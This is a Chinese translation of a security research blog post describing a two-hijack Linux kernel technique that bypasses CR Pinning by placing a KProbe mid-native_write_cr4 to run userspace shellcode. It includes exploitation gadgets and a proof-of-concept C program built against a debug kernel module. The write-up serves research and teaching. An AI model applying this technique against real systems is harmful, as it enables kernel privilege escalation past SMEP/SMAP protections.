---
title: 重新审视\"两发\"内核 Shellcode 执行：从控制流劫持到绕过 CR Pinning
url: https://mp.weixin.qq.com/s/uKaqgVLb7BCB8EBGqModrw
source: Doonsec's feed
date: 2026-05-21
fetch_date: 2026-05-22T06:03:12.614630
---

# 重新审视\"两发\"内核 Shellcode 执行：从控制流劫持到绕过 CR Pinning

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/h4gtbB74nSiaZSabP0mSG6UvTPiaExTGgxXmibJ01BUahjFpbmFADJavcf2Dne1QtNptbFecn2j1YYpQdoia4icvdZibia0TAhaepibsrmdlvPuNhws/0?wx_fmt=jpeg)

# 重新审视"两发"内核 Shellcode 执行：从控制流劫持到绕过 CR Pinning

Jennifer Miller
Jennifer Miller

securitainment

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

| 原文链接 | 作者 |
| --- | --- |
| https://blog.zolutal.io/two-shot-kernel-shellcode/ | Jennifer Miller |

我撰写 System Register Hijacking 论文的灵感之一，来自 Project Zero 的 Andrey Konovalov 所写的这篇博客文章。文中他描述了一种绕过 SMEP/SMAP 的方法：利用内核中的 `native_write_cr4`函数（在当时该函数实际等价于 `mov cr4, rdi; ret;`）。他先将控制流劫持到 `native_write_cr4`以禁用 SMEP/SMAP，然后再发起一次控制流劫持来执行用户态 shellcode。

在那篇博客之后，Linux 中引入了一项通常被称为 "CR Pinning" 的缓解措施。本质上，它通过改造 `native_write_cr[0,4]`函数的结构来阻止该博客所展示的那种滥用方式。

目前 `native_write_cr4`函数的实现如下：

```
staticconstunsignedlong cr4_pinned_mask = X86_CR4_SMEP | X86_CR4_SMAP | X86_CR4_UMIP |
     X86_CR4_FSGSBASE | X86_CR4_CET | X86_CR4_FRED;
staticDEFINE_STATIC_KEY_FALSE_RO(cr_pinning);
staticunsignedlong cr4_pinned_bits __ro_after_init;

...

void __no_profile native_write_cr4(unsignedlong val)
{
unsignedlong bits_changed = 0;

set_register:
asmvolatile("mov %0,%%cr4": "+r" (val) : : "memory");

if (static_branch_likely(&cr_pinning)) {
if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
goto set_register;
}
/* Warn after we've corrected the changed bits. */
WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
  bits_changed);
}
}
```

这里存在一个全局变量 `cr4_pinned_bits`用于指定该寄存器的固定取值，以及一个掩码用于指定哪些位会受到 `CR Pinning`缓解措施的影响。如果你尝试将控制流劫持到这个函数，cr4 寄存器虽然会被覆写，但后续代码会按照 `cr4_pinned_bits`全局变量重新设置被锁定位的值。

在做 System Register Hijacking 期间，我们确实在内核的其他位置——`sev_modify_cbit`——发现了一个相当干净的写 cr4 gadget：

```
<sev_verify_cbit+69>:mov    cr4,rsi
<sev_verify_cbit+72>:je     0xffffffff810003f7 <sev_verify_cbit+87>
<sev_verify_cbit+74>:xor    rsp,rsp
<sev_verify_cbit+77>:sub    rsp,0x1000
<sev_verify_cbit+84>:hlt
<sev_verify_cbit+85>:jmp    0xffffffff810003f4 <sev_verify_cbit+84>
<sev_verify_cbit+87>:mov    rax,rdi
<sev_verify_cbit+90>:jmp    0xffffffff82142cc0 <srso_alias_return_thunk>
```

假设标志寄存器处于正确状态，这个函数实际等价于一个 `mov cr4, rsi; mov rax, rdi; ret;`序列。这相当不错，但条件跳转对标志寄存器状态的依赖比较麻烦——这意味着在某些调用点上根本无法使用，除非先用 ROP 修改标志寄存器。

于是我开始思考：还有没有别的办法绕过 `CR Pinning`缓解措施？

## 注意那道缝隙永久链接

CR Pinning 缓解措施……说实话有点奇怪。你实际上是能覆写 cr4 的，只是几条指令之后它又被设为修正后的值。不过我也想不出更好的实现方式：只要内核中任何位置存在 `mov cr4, r..`指令，从体系结构上就无法真正阻止有人将控制流劫持到那里（撇开 CFI 不谈）。所以在写入发生之后再做修正，差不多已经是能做到的最好程度了。

但我觉得很有意思的是：在你覆写 cr4 与它被修正之间存在一道"缝隙"。理论上，内核甚至有可能在这道缝隙之中被时钟中断抢占，从而在使用被劫持的 cr4 值的同时执行其他代码，之后再继续走到那段重置锁定位的代码。

不过抢占这种情况依赖一个非常狭窄的时间窗口——毕竟那段缝隙里指令很少——使其在实践中无法使用。

但是，如果有一种办法可以可靠地在那个窗口里运行代码呢？

## KProbing永久链接

事实证明，内核里有一个叫做 KProbes 的 API，它允许在运行时为了跟踪的目的将一条断点指令插入到内核代码中，并在跨过该断点的前后调用所提供的处理函数。这个 API 是特权操作，但既然我们已经具备控制流劫持能力，就可以直接调用它。

这个 API 相当简单：你可以通过 `register_kprobe`函数注册一个 kprobe，该函数接受一个参数 `struct kprobe *`。kprobe 结构体里有一个字段用于设置希望放置断点的地址（或者也可以提供符号名加偏移量），还有 `pre_handler`和 `post_handler`回调的地址。

如果我们在 `native_write_cr4`的"缝隙"中间注册一个 KProbe，并把 pre 或 post 处理函数设为一个用户态地址，那么控制流就会在 cr4 值被修正之前被重定向到用户态。

## 参数永久链接

不过要调用 `register_kprobe`，我们需要控制 rdi，并且需要能在内核内存的某个位置伪造一个 `struct kprobe`。

至于 rdi 的控制，也许某个堆分配的函数表能让你控制 rdi，但我并不知道有这样的表。不过控制 rsi 是相当常见的，找了一会儿之后，我发现有一个叫 `devm_action_release`的函数实际上相当于一个 `mov rdi, [rsi]; mov rax, [rsi+0x8]; call rax;`gadget。所以只要我们能把一对 rdi 与 rip 值放到内存的某处，让 rsi 指向那里，就可以调用这个函数来获得 rdi 控制。

好在已经存在一些方法可以在内核中已知（或可推断）的位置上放置受控数据。其中之一是大量喷射 mmap 页面、通过侧信道泄露 physmap 基地址，然后猜一个相对于 physmap 基地址的位置，使其上可能存在某个 mmap 页面。另一种选择是使用 n132 发现的 NPerm技术，它可以让你在相对于内核映像的位置放置数据。

## 把剩下的猫头鹰画完永久链接

既然我们能够把控制流重定向到 `native_write_cr4`的中间（也可以将目标设为 `sev_verify_cbit`），剩下的就是把所有部分拼装到一起。我用一个内核模块做了 PoC，但同样的思路也可以应用到真实的漏洞利用中。

ioctl 命令会根据作为参数传入的 `arb_call_req`结构体，使用两个参数发起控制流劫持。两次调用中，第一个参数都被设为 0xdeadbeef，因为我不想假定能控制 rdi。

完整的 PoC 可见此处，其主要逻辑如下：

```
// used by devm_action_release gadget
structpc_arg {
    u64 a0;
    u64 pc;
};

structnperm_payload {
structkprobe kp;
structpc_arg pa1;
structpc_arg pa2;
};

// Control flow returns here
voidfrom_kernel() {
int uid = getuid();
char flag[0x20] = {0};
int flag_fd = open("/flag", O_RDONLY);
    read(flag_fd, flag, sizeof(flag));
    write(1, flag, sizeof(flag));

while (1) {}
}

intmain(intargc, char **argv) {
structarb_call_req req;
    u64 kaslr_base = 0xffffffff81000000;
    u32 dbg = open("/proc/dbg-mod", 2);

    sandbox();
    save_state();

// address of some controlled data placed by nperm.
    u64 nperm_addr_guess = 0xffffffff84c11000;

structnperm_payload payload = {
        .kp = {
            .addr = (void *)0xffffffff8107220e, // in the middle of `native_write_cr4`
            .pre_handler = escalate_privs, // userspace shellcode
            .post_handler = (void *)0xdeadbeefcafeb0ba,
        },
        .pa1 = {
            .pc = 0xffffffff812542d0, // register_kprobe
            .a0 = nperm_addr_guess,
        },
        .pa2 = {
            .pc = 0xffffffff81072200, // native_write_cr4
            .a0 = 0x450ef0, // PKE OSXSAVE FSGSBASE UMIP OSXMMEXCPT OSFXSR PGE MCE PAE PSE
        },
    };

    nperm(&payload, sizeof(payload));

// gadget to get control of rdi
    u64 devm_action_release = 0xffffffff81b24770;

    req.pc = devm_action_release;
    req.a0 = 0xdeadbeef;
    req.a1 = nperm_addr_guess + offsetof(structnperm_payload, pa1);
    ioctl(dbg, 1337, &req);

    req.pc = devm_action_release;
    req.a0 = 0xdeadbeef;
    req.a1 = nperm_addr_guess + offsetof(structnperm_payload, pa2);
    ioctl(dbg, 1337, &req);

// Control flow continues in from_kernel()

    return 0;
}
```

## 总结永久链接

我觉得无论在内核态还是用户态，拿到 shellcode 执行能力都是一件很有意思的事，仅仅因为能够运行任意代码就意味着对系统/程序的彻底"占领"。这项技术经过同一个函数，使用与 2017 年那篇老博客同样次数的"控制流劫持"达成了 shellcode 执行，我觉得这一点很有趣。

理论上，KProbe 这一思路还可以应用到其他位置——任何一段指令序列，只要紧随其后放置一个 KProbe，并用回调把控制权链接到下一处代码位置，它就能变成一个 gadget。可惜的是，KProbe 回调函数在运行时使用的是保存在 `pt_regs`中的原始寄存器状态，这限制了将多个 kprobe 串联起来作为某种 KProbe Oriented Programming（KPOP？）的有效性。不过仍然有可能利用 percpu 变量或其他非寄存器的方式来保存计算结果，所以别太早对 KPOP 死心 :p

这其实只是一个我想拿出来玩一玩的傻念头，但我借此对 KProbes 学到了很多，也是第一次用上 NPerm。总之，感谢阅读，希望你也从中有所收获！

---

> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOSzVJlQkf89Vd656PRcKTQzzdNktnMJbmEYjZwfCOG7Y5qIwOvnIPVEPXAKzWb9D4t5SdUCy4gCg/0?wx_fmt=png)

securitainment

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOSzVJlQkf89Vd656PRcKTQzzdNktnMJbmEYjZwfCOG7Y5qIwOvnIPVEPXAKzWb9D4t5SdUCy4gCg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过